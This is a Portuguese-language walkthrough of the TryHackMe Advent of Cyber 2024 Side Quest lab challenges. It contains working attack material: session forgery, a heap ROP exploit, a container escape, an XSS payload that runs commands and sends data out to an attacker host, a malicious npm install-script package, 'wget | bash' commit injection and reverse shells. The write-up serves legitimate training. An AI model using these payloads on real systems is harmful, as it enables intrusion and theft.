# Guia de resolução: Advent of Cyber 2024 Side Quest

Este guia acompanha os cinco desafios da [Side Quest de 2024](https://tryhackme.com/room/adventofcyber24sidequest). As respostas ficam mascaradas. Obtenha os valores nos laboratórios da sua sessão e use a senha de cada cartão encontrado na sala principal do [Advent of Cyber 2024](https://tryhackme.com/room/adventofcyber2024).

Para as tarefas que exigem uma máquina de ataque, use uma máquina Linux própria conectada à VPN ou a AttackBox do TryHackMe. Recomendamos a máquina própria para conservar histórico, arquivos e ferramentas entre sessões; veja as [opções de conexão](../../../README.md#máquina-local-conectada-à-vpn). As VMs gráficas e os arquivos fornecidos pela sala podem ser usados diretamente quando a tarefa assim orientar.

## T1 - Operation Tiny Frostbite

### Obtenha o cartão T1

No desafio do dia 1 do Advent of Cyber 2024, examine os repositórios GitHub citados pela atividade de OPSEC. O código do servidor C2 contém a chave de sessão do Flask. A aplicação tem uma rota `/dashboard` que apenas verifica se a sessão contém `logged_in`. No laboratório do dia 1, encontre a porta Web do C2 e assine uma sessão com essa chave:

```bash
pipx run flask-unsign --sign --legacy \
  --cookie "{'logged_in': True, 'username': 'admin'}" \
  --secret '<CHAVE_DE_SESSAO_DO_C2>'

curl -b 'session=<COOKIE_ASSINADO>' 'http://<IP_DO_DIA_1>:8000/dashboard'
```

O painel exibe o cartão T1. Anote a senha que aparece nele; ela abre o arquivo da Side Quest. Se a versão do Flask e do `flask-unsign` não exigirem compatibilidade antiga, repita a assinatura sem `--legacy`.

### Analise o PCAP do laboratório

Inicie a VM da tarefa T1 e baixe o ZIP com o Kali conectado à VPN. Confira o MD5 informado na sala antes de extrair `traffic.pcap` com a senha do cartão.

```bash
curl -fL 'http://<IP_T1>/aoc_sq_1.zip' -o aoc_sq_1.zip
md5sum aoc_sq_1.zip
unzip -P '<SENHA_DO_CARTAO_T1>' aoc_sq_1.zip
```

Filtre os POSTs HTTP e localize `/register.php` e `/admin/login.php`. O campo `http.file_data` sai em hexadecimal; converta os bytes da requisição com `xxd -r -p`. O cadastro de `frostyfox` fornece a primeira senha, e o POST de `mcskidy` fornece a segunda.

```bash
tshark -r traffic.pcap \
  -Y 'http.request.method == "POST"' \
  -T fields -e frame.number -e http.request.uri -e http.file_data

tshark -r traffic.pcap -Y 'frame.number == <NUMERO_DO_QUADRO>' \
  -T fields -e http.file_data | xxd -r -p
```

O tráfego TCP da porta 9002 contém um segundo ZIP, `elves.zip`, transferido pelo invasor. Encontre o identificador do fluxo e recupere os bytes com o script original [extrair_fluxo_tcp.py](scripts/extrair_fluxo_tcp.py). Ele usa a remontagem de TCP do TShark e grava a direção do envio em um arquivo.

```bash
tshark -r traffic.pcap -Y 'tcp.port == 9002' \
  -T fields -e tcp.stream | sort -u

python3 scripts/extrair_fluxo_tcp.py traffic.pcap <NUMERO_DO_FLUXO> elves.zip
unzip -l elves.zip
```

Para descobrir a senha desse segundo ZIP, analise o tráfego na porta 9001. Exporte os objetos HTTP do PCAP e procure o binário `ff`. A inspeção das strings revela a chave de comunicação do TinySHell/Rekoobe. O script original [decifrar_rekoobe.py](scripts/decifrar_rekoobe.py) usa a chave e os vetores de inicialização registrados no PCAP para decifrar o fluxo. Procure o comando `zip -P` na saída: o argumento após `-P` é a terceira resposta.

```bash
mkdir -p objetos
tshark -r traffic.pcap --export-objects http,objetos
strings -a objetos/ff | less

python3 -m venv .venv
.venv/bin/pip install pycryptodome
.venv/bin/python scripts/decifrar_rekoobe.py traffic.pcap '<CHAVE_ENCONTRADA_EM_FF>' \
  | grep 'zip -P'
```

Abra `elves.zip` com a senha observada no comando decifrado. O dump `elves.sql` contém o registro de `mcskidy`; o valor da coluna de senha desse registro é a quarta resposta.

```bash
unzip -P '<SENHA_DO_SEGUNDO_ZIP>' elves.zip
grep -n mcskidy elves.sql
```

**Resposta:** `QU9...` (senha do cadastro, 19 caracteres).

**Resposta:** `pbn...` (senha capturada, 19 caracteres).

**Resposta:** `9jY...` (senha do segundo ZIP, 21 caracteres).

**Resposta:** `faX...` (senha no banco, 29 caracteres).

## T2 - Yin and Yang

### Obtenha o cartão T2 e inicie as duas VMs

No dia 5 da sala principal, use a falha XXE do formulário XML para ler os arquivos de configuração do servidor. A configuração expõe uma aplicação interna; consulte seu `access.log` para encontrar o caminho da imagem do cartão T2. Anote a senha mostrada na imagem. Inicie as VMs YIN, nesta tarefa, e YANG, na [sala separada](https://tryhackme.com/room/yang). Para cada IP, envie a senha ao serviço de desbloqueio:

```bash
curl -X POST -H 'Content-Type: application/json' \
  --data '{"k":"<SENHA_DO_CARTAO_T2>"}' http://<IP_YIN>:21337/unlock
curl -X POST -H 'Content-Type: application/json' \
  --data '{"k":"<SENHA_DO_CARTAO_T2>"}' http://<IP_YANG>:21337/unlock
nmap -sT -p 22,11311,21337 <IP_YIN> <IP_YANG>
```

Entre por SSH com as credenciais indicadas nas duas salas: `yin`/`yang` para YIN e `yang`/`yin` para YANG. Em ambas as máquinas, `sudo -l` permite executar sem senha o script `/catkin_ws/yin.sh` ou `/catkin_ws/yang.sh`. Leia os programas Python em `/catkin_ws/src/yin/scripts/runyin.py` e `/catkin_ws/src/yang/scripts/runyang.py` antes de iniciar os nós. O YIN publica comandos no tópico ROS `messagebus`; o YANG responde incluindo sua própria chave privada em `actionparams[0]`. Além disso, o YANG compara a assinatura recebida com uma assinatura produzida pela sua própria chave, permitindo forjar mensagens com a chave vazada.

### Conecte o ROS das máquinas

No YIN, inicie o mestre e o nó:

```bash
source /opt/ros/noetic/setup.bash
source /catkin_ws/devel/setup.bash
nohup roscore >/tmp/roscore.log 2>&1 &
nohup sudo /catkin_ws/yin.sh >/tmp/yin.log 2>&1 &
```

O mestre ROS escuta em `127.0.0.1:11311`. Na sua máquina Kali, mantenha dois túneis SSH abertos em terminais separados, depois inicie o nó no YANG. Confira com `rostopic list` e `rosservice list` se aparecem `messagebus` e `svc_yang`.

```bash
ssh -N -L 11311:127.0.0.1:11311 yin@<IP_YIN>
ssh -N -R 11311:127.0.0.1:11311 yang@<IP_YANG>

# No terminal SSH do YANG:
source /opt/ros/noetic/setup.bash
source /catkin_ws/devel/setup.bash
nohup sudo /catkin_ws/yang.sh >/tmp/yang.log 2>&1 &
rostopic list
rosservice list
```

### Recupere o controle de YANG e YIN

No YANG, execute o script original [capturar_chave_yang.py](scripts/capturar_chave_yang.py) para guardar a chave que o próprio nó publica em `messagebus`. Em seguida, use [publicar_comando_yang.py](scripts/publicar_comando_yang.py) para assinar um comando destinado ao YANG. O programa remoto o executa com privilégios de `root`. O comando abaixo cria um shell SUID para ler a flag do YANG e o segredo do serviço ROS:

```bash
python3 scripts/capturar_chave_yang.py
python3 scripts/publicar_comando_yang.py \
  'cp /bin/bash /home/yang/.rootbash && chmod 4755 /home/yang/.rootbash'
/home/yang/.rootbash -p -c 'cat /root/yang.txt; cat /catkin_ws/secret.txt'
```

No YIN, use o segredo recuperado do YANG com [solicitar_acao_yin.py](scripts/solicitar_acao_yin.py). O serviço `/svc_yang` aceita o segredo e executa o campo `command` como `root`. Leia a flag que o serviço copiar para a pasta do usuário:

```bash
python3 scripts/solicitar_acao_yin.py '<SEGREDO_DO_YANG>' \
  'cp /root/yin.txt /home/yin/flag.txt && chmod 644 /home/yin/flag.txt'
cat /home/yin/flag.txt
```

**Resposta:** `THM{Yin...}` (flag obtida no YIN).

**Resposta:** `THM{Yang...}` (flag obtida no YANG).

## T3 - Escaping the Blizzard

### Localize o cartão T3

No laboratório do dia 12 da sala principal, entre no aplicativo bancário e faça uma transferência de teste. A página apresenta um identificador de transação com 32 caracteres hexadecimais. O identificador é o MD5 de um número sequencial. Consulte `/transactions?id=<MD5>` para números próximos ao da sua transação (por exemplo, 1330 a 1350) e compare o campo `status`. Uma das respostas contém texto Base64; decodifique-o para encontrar o caminho da imagem do cartão T3.

```bash
for numero in $(seq 1330 1350); do
  id=$(printf '%s' "$numero" | md5sum | cut -d' ' -f1)
  curl -sS -b 'session=<COOKIE_DA_SUA_SESSAO>' \
    "http://<IP_DO_DIA_12>:5000/transactions?id=$id"
  echo
done

printf '%s' '<STATUS_EM_BASE64>' | base64 -d
```

Inicie a VM do T3, espere a inicialização do serviço em `21337/tcp` e envie a senha do cartão para abrir o firewall. Faça o reconhecimento; as portas 80 e 1337 passam a responder.

```bash
curl -X POST -H 'Content-Type: application/json' \
  --data '{"k":"<SENHA_DO_CARTAO_T3>"}' http://<IP_T3>:21337/unlock
nmap -sT -p 22,80,1337,21337 <IP_T3>
```

### Extraia `foothold.txt` do backup

O índice `http://<IP_T3>/backup/` expõe `enc`, `recommended-passwords.txt` e `secure-storage.zip`. O ZIP exige uma senha transformada pelo executável `enc`. Baixe os três arquivos, gere os candidatos com a lista fornecida e teste cada um até encontrar o que abre o arquivo. O script original [testar_senhas_zip.py](scripts/testar_senhas_zip.py) automatiza essa etapa sem embutir a resposta.

```bash
mkdir -p t3 && cd t3
for arquivo in enc recommended-passwords.txt secure-storage.zip; do
  curl -fL "http://<IP_T3>/backup/$arquivo" -o "$arquivo"
done
chmod +x enc
python3 -m venv .venv
.venv/bin/pip install pyzipper
.venv/bin/python ../scripts/testar_senhas_zip.py ./enc recommended-passwords.txt secure-storage.zip
7z x -p'<SENHA_ENCONTRADA>' secure-storage.zip
cat secure-storage/foothold.txt
```

**Resposta:** `THM{th1...}` (conteúdo de `foothold.txt`).

### Explore o programa `secureStorage`

O backup também traz `secureStorage`, `libc.so.6` e `ld-linux-x86-64.so.2`, as mesmas versões usadas pelo serviço da porta 1337. Analise o binário local com `checksec`, `objdump` e um depurador. As opções 1, 2 e 3 criam, mostram e editam registros. A escrita aceita 16 bytes além do tamanho pedido ao `malloc`, permitindo alterar o cabeçalho do bloco seguinte do heap.

A sequência de exploração é:

1. Alocar 256 bytes e sobrescrever o tamanho do *top chunk* com `0xc61`; uma nova alocação de `0xf98` bytes move o bloco antigo para o *unsorted bin*.
2. Alocar 24 bytes, exibir o registro e extrair o endereço da libc preservado no bloco. Editar o mesmo registro e exibi-lo novamente para obter o endereço do heap.
3. Sobrescrever um novo *top chunk* com tamanho `0x61` duas vezes; isso preenche o *tcache bin* de `0x40`. Alterar o ponteiro encadeado com `alvo XOR (endereco_do_bloco >> 12)` para alocar um registro perto de `__libc_argv` e vazar um endereço da pilha.
4. Repetir a técnica com tamanho `0x421`, visando o endereço de retorno de `main` na pilha. Escrever uma cadeia ROP com um `ret`, `pop rdi; ret`, o endereço de `/bin/sh` e `system` da libc fornecida. Escolher a opção de saída do programa para disparar a cadeia.

Os deslocamentos devem ser confirmados na `libc.so.6` e na instância local com GDB. Na versão observada, os vazamentos subtraídos de `0x204120` e `0x3a0` deram as bases da libc e do heap; o endereço de retorno ficou `0x120` bytes antes do endereço da pilha obtido em `__libc_argv`. Verifique os valores após cada tentativa, pois ASLR muda as bases. Quando a cadeia abrir o shell no contêiner, leia `/root/user.txt`.

**Resposta:** `THM{h4v...}` (conteúdo de `user.txt`).

### Saia do contêiner e leia `root.txt`

O contêiner permite alterar `/proc/sys/kernel/core_pattern`. O caminho `upperdir` da montagem `overlay` mostra onde um arquivo criado dentro do contêiner aparece no host. Crie um script em `/tmp` que copie a flag do host para um arquivo da camada gravável. Aponte `core_pattern` para o caminho desse script no host, provoque um *core dump* com `os.abort()` e leia o arquivo copiado. Restaure o valor anterior de `core_pattern` ao terminar.

```bash
ORIGINAL=$(cat /proc/sys/kernel/core_pattern)
UPPER=$(mount | grep -o 'upperdir=[^,]*' | cut -d= -f2)
printf '#!/bin/sh\ncp /root/root.txt %s/tmp/hostroot.txt\nchmod 644 %s/tmp/hostroot.txt\n' \
  "$UPPER" "$UPPER" > /tmp/host.sh
chmod +x /tmp/host.sh
printf '|%s/tmp/host.sh\n' "$UPPER" > /proc/sys/kernel/core_pattern
ulimit -c unlimited
python3 -c 'import os; os.abort()'
cat /tmp/hostroot.txt
printf '%s\n' "$ORIGINAL" > /proc/sys/kernel/core_pattern
```

**Resposta:** `THM{w00...}` (conteúdo de `root.txt`).

## T4 - Krampus Festival

### Encontre o cartão e abra a rede

No laboratório do dia 17 da sala principal, examine o aplicativo de câmeras. O formulário de entrada e o parâmetro usado para escolher uma gravação aceitam injeção SQL. Enumere as gravações cadastradas e procure a que não aparece na lista comum, com o identificador `1337`. Abra o vídeo e anote a senha mostrada no cartão T4.

Inicie a VM do T4 e envie essa senha à porta 21337. Faça um reconhecimento das portas abertas, sobretudo SMB, IMAP, SMTP e WinRM.

```bash
curl -X POST -H 'Content-Type: application/json' \
  --data '{"k":"<SENHA_DO_CARTAO_T4>"}' http://<IP_T4>:21337/unlock
nmap -sT -sV -p 80,143,445,587,5985,21337 <IP_T4>
```

### Examine o compartilhamento e o correio

O servidor SMB aceita acesso como `guest` ao compartilhamento `ChristmasShare`. Baixe `flag.txt` e `approved.xlsx`. A planilha traz candidatos a senha e os metadados revelam a conta `developer@test.corp`. Teste os candidatos no IMAP e leia as mensagens quando uma autenticação funcionar.

```bash
smbclient -L //<IP_T4>/ -U 'guest%'
smbclient //<IP_T4>/ChristmasShare -U 'guest%' \
  -c 'get flag.txt; get approved.xlsx'
cat flag.txt
exiftool approved.xlsx
```

Para testar cada senha sem expô-la no histórico do terminal, use `imaplib.IMAP4('<IP_T4>', 143)` em um script Python, chame `login('developer@test.corp', senha)` e, após o primeiro sucesso, use `select('INBOX')`, `search(None, 'ALL')` e `fetch(id, '(RFC822)')`. As mensagens do remetente `snowflakes.crawler@socmas.corp` indicam o documento que a conta automatizada espera receber. O email também informa que somente conexões HTTPS de saída pela porta 443 são permitidas.

**Resposta:** `THM{unl...}` (conteúdo de `flag.txt` no SMB).

### Obtenha a sessão da conta automatizada

Prepare um documento com macro que, ao abrir, faça uma conexão HTTPS de retorno à sua máquina da VPN. Configure um receptor em `443/tcp` e envie o documento pela conta `developer@test.corp` ao remetente da solicitação. Inspecione a resposta do correio e o tráfego no receptor: o processamento da mensagem é periódico. Arquivos com extensão `docm` são adequados para uma macro; um arquivo `docx` comum não armazena VBA executável. A execução ocorre como `scrawler`.

Na sessão obtida, enumere as credenciais de `scrawler` no registro `Winlogon`, os usuários do domínio e as descrições das contas. Uma descrição divulga a senha de `Winterberry_Locksmit`; teste sua reutilização para `Krampus_Debugger`. Essa conta possui `GenericWrite` sobre `Krampus_Shadow`.

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
whoami /all
```

Use `pyWhisker` ou `certipy-ad shadow auto` para adicionar temporariamente uma credencial de chave à conta `Krampus_Shadow` e solicitar sua autenticação Kerberos. A conta pertence ao grupo que administra o IIS e permite uma sessão WinRM. No servidor web, altere uma página Razor do aplicativo para executar um comando como a identidade do pool do IIS. Essa sessão permite ler o arquivo `user.txt`.

**Resposta:** `THM{kra...}` (conteúdo de `user.txt`).

### Eleve privilégios na máquina Windows

Na sessão do pool do IIS, execute `whoami /priv` e confirme `SeImpersonatePrivilege`. Use uma técnica de personificação compatível com essa versão do Windows, como EfsPotato, para obter uma sessão `NT AUTHORITY\SYSTEM`. Procure `root.txt` e leia seu conteúdo. Remova as credenciais de chave adicionadas à conta e os arquivos de apoio ao terminar.

```powershell
whoami /priv
whoami
Get-ChildItem C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue
```

**Resposta:** `THM{kra...}` (conteúdo de `root.txt`).

## T5 - An Avalanche of Web Apps

### Recupere o cartão e descubra os serviços

No dia 19 da sala principal, obtenha o jogo `TryUnlockMe` e a biblioteca `libaocgame.so`. Ao analisar a biblioteca com `nm -D`, `strings` e Ghidra, encontre a função exportada `_Z14create_keycardPKc`. Ela espera uma frase específica e grava um ZIP com o cartão L5. A frase pode ser reconstruída a partir das comparações na função; o jogo também revela a senha do ZIP. Extraia o cartão e anote a senha de desbloqueio do laboratório.

```bash
nm -D libaocgame.so | c++filt | grep create_keycard
strings TryUnlockMe | grep -i 'password\|vault'
```

Inicie a VM do T5, aguarde o serviço `21337/tcp` e desbloqueie as portas com a senha do cartão. A porta 53 permite transferência da zona DNS, que revela os nomes `thehub-uat`, `thehub-int`, `adm-int` e `npm-registry`.

```bash
curl -X POST -H 'Content-Type: application/json' \
  --data '{"k":"<SENHA_DO_CARTAO_L5>"}' http://<IP_T5>:21337/unlock
nmap -sT -sV -p 22,53,80,3000,21337 <IP_T5>
dig axfr @<IP_T5> bestfestivalcompany.thm
```

### Explore o formulário e a wiki interna

Use o cabeçalho `Host: thehub-uat.bestfestivalcompany.thm:3000` para acessar o site de testes na porta 3000. A página tem um formulário `POST /contact` com os campos `name`, `email` e `message`. Uma conta automatizada lê as mensagens recebidas. Envie uma mensagem com JavaScript que faça uma chamada de teste para um servidor HTTP na sua máquina da VPN; o retorno confirma XSS armazenado. O navegador da conta automatizada abre a página interna `/contact-responses` em `172.16.1.3:5000` e pode acessar `/wiki` com sua sessão.

```bash
python3 -m http.server 8001

curl -X POST -H 'Host: thehub-uat.bestfestivalcompany.thm:3000' \
  --data-urlencode 'name=Teste' \
  --data-urlencode 'email=teste@example.net' \
  --data-urlencode 'message=<script>new Image().src="http://<IP_DA_SUA_VPN>:8001/teste"</script>' \
  'http://<IP_T5>:3000/contact'
```

No registro de pacotes `npm-registry.bestfestivalcompany.thm`, baixe `markdown-converter` e examine `package/index.js`:

```bash
curl -sS -H 'Host: npm-registry.bestfestivalcompany.thm' \
  'http://<IP_T5>/markdown-converter' > pacote.json
curl -sS -H 'Host: npm-registry.bestfestivalcompany.thm' \
  'http://<IP_T5>/markdown-converter/-/markdown-converter-1.0.0.tgz' \
  -o markdown-converter-1.0.0.tgz
tar -xOzf markdown-converter-1.0.0.tgz package/index.js
```

O código passa o conteúdo entre `{{` e `}}` para `vm.runInNewContext`, incluindo `require` no contexto. Envie, pelo JavaScript da mensagem armazenada, um `POST /wiki` com `title` e `markdownContent`; depois abra o item criado em `/wiki/<ID>`. O exemplo a seguir lê `flag-*.txt` no contêiner e envia seu conteúdo ao receptor da porta 8001. Grave o código em `flag-t5.html` e envie-o no campo `message` do formulário como no exemplo anterior.

```html
<script>
const markdownContent = '{{(function(){var d=require("child_process").execSync("cat /flag*.txt").toString();require("http").get("http://<IP_DA_VPN>:8001/flag?data="+encodeURIComponent(d));return "ok"})()}}';
fetch('/wiki', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: new URLSearchParams({title: 'Inventario', markdownContent})
}).then(() => fetch('/wiki'))
  .then(r => r.text())
  .then(t => {
    const ids = [...t.matchAll(/href="\/wiki\/(\d+)"/g)].map(x => Number(x[1]));
    return fetch('/wiki/' + Math.max(...ids));
  });
</script>
```

O robô executa o JavaScript no domínio interno, cria o item da wiki e abre a página para disparar a expressão. Se quiser primeiro confirmar a execução de comandos sem ler a flag, troque `cat /flag*.txt` por `ls -la /`.

**Resposta:** `THM{09a...}` (conteúdo de `flag-*.txt` no contêiner da wiki).

### Faça o pivô e examine o servidor administrativo

Para continuar, abra uma sessão no contêiner da wiki. O script original [gerar_payload_t5.py](scripts/gerar_payload_t5.py) cria a mensagem XSS que envia uma expressão à wiki, baixa um `chisel` estático, inicia um túnel SOCKS reverso e abre um shell na máquina Kali. Use a versão estática do `chisel` porque o contêiner usa Alpine; uma versão vinculada à glibc pode aparecer como `not found`, mesmo após o download.

Em terminais separados no Kali, prepare o binário, o túnel e os receptores. O script [receber_t5.py](scripts/receber_t5.py) registra callbacks e recebe os arquivos que você enviar do contêiner. Substitua `<IP_DA_VPN>` pelo endereço da interface que alcança o laboratório.

```bash
file chisel                          # deve indicar "statically linked"
python3 -m http.server 8002 --directory <PASTA_COM_CHISEL>
chisel server --reverse --port 9002
python3 scripts/receber_t5.py --saida recebido.bin
nc -lvnp 9003

python3 scripts/gerar_payload_t5.py <IP_DA_VPN> > contato.html
curl -X POST -H 'Host: thehub-uat.bestfestivalcompany.thm:3000' \
  --data-urlencode 'name=Teste' \
  --data-urlencode 'email=teste@example.net' \
  --data-urlencode 'message@contato.html' \
  'http://<IP_T5>:3000/contact'
```

O robô lê as mensagens periodicamente. Quando o shell abrir, confira `id` e a rota `/app/bfc_thehubuat/assets`. O túnel `R:socks` expõe SOCKS5 em `127.0.0.1:1080` no Kali. Uma configuração mínima para o `proxychains4` é:

```text
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
```

O diretório `assets/.git` não pode ser lido pela rota Web, mas está acessível no shell. Compacte-o e envie o arquivo à porta 8001 com Node.js. No Kali, descompacte o arquivo recebido e examine os commits. Um commit antigo guarda `assets/backups/backup.key`, removida em um commit posterior.

```bash
# No contêiner da wiki:
tar -czf /tmp/assets.tgz -C /app/bfc_thehubuat assets
node -e 'const fs=require("fs"),h=require("http");const b=fs.readFileSync("/tmp/assets.tgz");const r=h.request("http://<IP_DA_VPN>:8001/upload",{method:"POST",headers:{"Content-Length":b.length}},s=>s.resume());r.end(b)'

# No Kali:
tar -xzf recebido.bin
git -C assets log --oneline --all
git -C assets show <COMMIT_ANTIGO>:assets/backups/backup.key > backup.key
chmod 600 backup.key
proxychains4 -f proxychains.conf ssh -i backup.key git@172.16.1.1
GIT_SSH_COMMAND='ssh -i backup.key -o IdentitiesOnly=yes' \
  proxychains4 -f proxychains.conf git clone git@172.16.1.1:admint
```

A chave `backup.key` concede leitura aos repositórios internos. Em `admint/index.js`, a rota administrativa obtém `jwks.json` do site de testes a cada minuto e valida um JWT RS256 cujo `username` seja `mcskidy-adm`. Como o shell da wiki pode alterar o arquivo público, gere um par RSA e seu token com o script original [gerar_jwks_jwt.py](scripts/gerar_jwks_jwt.py). Ele grava `jwt.key`, `jwks.json` e `token.txt`, sem imprimir a chave privada no terminal.

```bash
python3 -m venv .venv
.venv/bin/pip install PyJWT cryptography requests pysocks
.venv/bin/python scripts/gerar_jwks_jwt.py ./jwt-t5
cp ./jwt-t5/jwks.json <PASTA_COM_CHISEL>/jwks.json

# No contêiner da wiki, usando o servidor HTTP do Kali na porta 8002:
wget -q http://<IP_DA_VPN>:8002/jwks.json \
  -O /app/bfc_thehubuat/assets/jwks.json

# Após cerca de um minuto, no Kali:
TOKEN=$(cat jwt-t5/token.txt)
curl --socks5-hostname 127.0.0.1:1080 \
  -H "Authorization: Bearer $TOKEN" \
  -X POST http://172.16.1.2:3000/restart-service
```

Uma resposta HTTP 400 informando a falta de `host` ou `service` confirma que a autenticação passou; a resposta 403 indica que a chave ainda não foi atualizada ou que o token não combina com ela. Sirva o `jwks.json` criado no diretório HTTP da porta 8002 antes do comando `wget`.

### Comprometa o serviço de administração e encontre a flag 2

O código de `admint` mostra as rotas `/modify-resolv` e `/reinstall-node-modules`. A primeira altera o resolvedor DNS de um contêiner; a segunda reinstala as dependências de um serviço. Faça `npm-registry.bestfestivalcompany.thm` resolver para o Kali, hospede um registro npm controlado na porta 4873 e ofereça um pacote `express@4.21.2` cujo script de instalação abra uma sessão. A pasta original [pacote_npm_t5](scripts/pacote_npm_t5/package.json) contém `package.json` e `exploit.js`; edite `IP_DA_SUA_VPN` no código antes de empacotar. O pacote procura a flag na raiz do contêiner e também abre um shell na porta 9004.

Configure `dnsmasq` no Kali para encaminhar as demais consultas ao DNS do laboratório e responder o nome do registro com o IP da VPN:

```text
port=53
listen-address=<IP_DA_VPN>
bind-interfaces
no-resolv
server=<IP_T5>
address=/npm-registry.bestfestivalcompany.thm/<IP_DA_VPN>
```

```bash
sudo dnsmasq --no-daemon --conf-file=dnsmasq-t5.conf
dig npm-registry.bestfestivalcompany.thm @<IP_DA_VPN> +short
npm pack ./scripts/pacote_npm_t5 --pack-destination .
.venv/bin/python scripts/registro_npm_t5.py \
  --tarball ./express-4.21.2.tgz \
  --host-registro npm-registry.bestfestivalcompany.thm \
  --upstream http://172.16.1.2:4873 \
  --socks socks5h://127.0.0.1:1080 \
  --escuta <IP_DA_VPN>
nc -lvnp 9004
```

O script original [registro_npm_t5.py](scripts/registro_npm_t5.py) calcula o SHA-1 e a integridade SHA-512 do arquivo empacotado. Para os demais caminhos, ele usa o SOCKS e encaminha a requisição ao Verdaccio interno. O metadado do `express` precisa conter `hasInstallScript: true`; sem esse campo, a reinstalação pode baixar o pacote sem executar o script.

Com o JWT ativo, envie as duas requisições administrativas pelo SOCKS. A reinstalação deve solicitar `/express` e o arquivo `.tgz` ao servidor controlado. Leia a flag recebida na porta 8001 ou no shell aberto na 9004.

```bash
curl --socks5-hostname 127.0.0.1:1080 \
  -H "Authorization: Bearer $TOKEN" \
  -d 'host=172.16.1.2&nameserver=<IP_DA_VPN>' \
  http://172.16.1.2:3000/modify-resolv

curl --socks5-hostname 127.0.0.1:1080 \
  -H "Authorization: Bearer $TOKEN" \
  -d 'host=172.16.1.2&service=admdev' \
  http://172.16.1.2:3000/reinstall-node-modules
```

**Resposta:** `THM{647...}` (arquivo `flag-*.txt` no contêiner administrativo).

### Examine o hook do Git e encontre a flag 3

No shell do contêiner administrativo, a chave `/app/admint/root.key` concede escrita em `admdev` no servidor Git. Copie-a para o Kali por uma conexão HTTP como a usada para `assets.tgz`. Use essa chave para consultar os repositórios e clonar `hooks_wip`, cujo arquivo `post-receive` mostra o problema: a mensagem de commit é colocada dentro de `bash -c` sem tratamento. Como você tem escrita em `admdev`, um commit com substituição de comando executa a carga no servidor Git durante o `push`.

```bash
chmod 600 root.key
proxychains4 -f proxychains.conf ssh -i root.key git@172.16.1.1
GIT_SSH_COMMAND='ssh -i root.key -o IdentitiesOnly=yes' \
  proxychains4 -f proxychains.conf git clone git@172.16.1.1:hooks_wip
cat hooks_wip/post-receive
```

Crie um script `gitstage.sh` que abra uma conexão reversa para a sua máquina na porta 9005; sirva-o no HTTP local da porta 8002. Grave a mensagem do commit em um arquivo de texto, para que a substituição de comando não seja executada no seu Kali. O comando abaixo é um exemplo de conteúdo para o arquivo; substitua o IP antes de usá-lo:

```text
$(wget -qO- http://<IP_DA_VPN>:8002/gitstage.sh | bash)
```

```bash
GIT_SSH_COMMAND='ssh -i root.key -o IdentitiesOnly=yes' \
  proxychains4 -f proxychains.conf git clone git@172.16.1.1:admdev
cd admdev
git config user.name laboratorio
git config user.email laboratorio@example.invalid
touch prova
git add prova
git commit -F ../mensagem.txt
nc -lvnp 9005
GIT_SSH_COMMAND='ssh -i ../root.key -o IdentitiesOnly=yes' \
  proxychains4 -f ../proxychains.conf git push origin main
```

No shell do servidor Git, confira `id` e leia `flag-*.txt` em `/home/git`.

**Resposta:** `THM{ff2...}` (arquivo `flag-*.txt` em `/home/git`).

### Eleve para root e encontre a flag 4

`sudo -l` permite que o usuário `git` execute `/usr/bin/git --no-pager diff *` como root. A opção `--help` abre a página de manual em um pager, mesmo com `--no-pager`. Se o shell reverso não tiver terminal interativo, crie uma PTY com Python e ajuste seu tamanho antes de abrir a ajuda. Dentro do pager, digite `!sh` e confirme o novo usuário com `id`.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty rows 30 cols 100
sudo -l
sudo /usr/bin/git --no-pager diff --help
# Dentro do pager, digite: !sh
id
cat /root/flag*.txt
```

**Resposta:** `THM{05a...}` (arquivo `flag-*.txt` em `/root`).

## Tarefa final - The End?

Abra a pesquisa vinculada na última tarefa da sala, envie seu feedback e copie a flag exibida ao final para o campo da tarefa. As regras da competição ficam na tarefa 3; leia-as e confirme o aceite no campo próprio.

**Resposta:** `THM{big...}` (flag exibida após a pesquisa).
